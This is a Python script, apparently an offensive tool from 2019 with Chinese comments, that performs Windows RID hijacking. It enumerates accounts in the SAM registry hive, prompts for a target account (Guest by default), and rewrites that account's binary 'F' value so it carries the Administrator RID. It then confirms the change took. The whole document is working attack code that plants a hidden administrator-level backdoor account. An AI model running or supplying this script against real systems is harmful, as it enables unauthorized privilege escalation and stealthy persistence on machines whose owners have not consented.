#author:九世
#time:2019/3/25

import os
import winreg
import binascii

keylist=[]
ridlist=[]
userslist={}

class Ridhacj:
    def __init__(self,path,path2):
        self.path=path
        self.path2=path2
    def rid_query(self):
        key=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,self.path)
        countkey=winreg.QueryInfoKey(key)[0]
        for i in range(int(countkey)):
            name=winreg.EnumKey(key,i)
            keylist.append(name)
        winreg.CloseKey(key)

    def users_query(self):
        for i in keylist:
            path3=r'{}\{}'.format(self.path,i)
            que=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,path3)
            value=winreg.QueryValueEx(que,'')
            ridlist.append(value[1])

    def rid_jack(self):
        for x in range(0,len(keylist)):
            userslist[keylist[x]]=(hex(ridlist[x]))
            print('Users:{} Rid:{}'.format(keylist[x],ridlist[x]))

        user=input('Please enter the username to be hijacked (The default space is Guest):')
        if user=='':
            ur='Guest'
        elif user:
            ur=user
        ud=str(userslist[ur]).replace('0x','')
        ud_administartor=str(userslist['Administrator']).replace('0x','')
        vk='00000{}'.format(ud) #获取要劫持的RID十六进制
        vk_administrator='00000{}'.format(ud_administartor) #获取Administrator的RID十六进制
        vk_s='{}{}{}{}'.format(ud[-2],vk[-1],vk[-4],vk[-3])
        administrator_s='{}{}{}{}'.format(vk_administrator[-2],vk_administrator[-1],vk_administrator[-4],vk_administrator[-3]) #获取Administrator的关键RID：F401
        zhi=r'{}\{}'.format(self.path2,vk)
        op=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,zhi,0,winreg.KEY_ALL_ACCESS) #读取注册表并设置以管理员权限即可操作注册表
        zk=winreg.QueryValueEx(op,'F') #读取F键值
        zqr=bytes.decode(binascii.b2a_hex(zk[0]),encoding='ascii') #解码成十六进制
        th=str(zqr).replace(vk_s,administrator_s) #将原来的RID十六进制替换成Administrator的RID十六进制
        vb=binascii.unhexlify(bytes(th,encoding='ascii'))
        winreg.SetValueEx(op,'F',1,winreg.REG_BINARY,vb)

        zhi = r'{}\{}'.format(self.path2, vk)
        op = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, zhi, 0, winreg.KEY_ALL_ACCESS)
        zb=winreg.QueryValueEx(op,'F')
        zb_s=bytes.decode(binascii.b2a_hex(zb[0]),encoding='ascii')
        if administrator_s in zb_s:
            print('[+] Rid hijacking success')
        else:
            print('[-] Rid Hijacking failure')


if __name__ == '__main__':
    path=r'SAM\SAM\Domains\Account\Users\Names'
    path2=r'SAM\SAM\Domains\Account\Users'
    obj=Ridhacj(path=path,path2=path2)
    obj.rid_query()
    obj.users_query()
    obj.rid_jack()
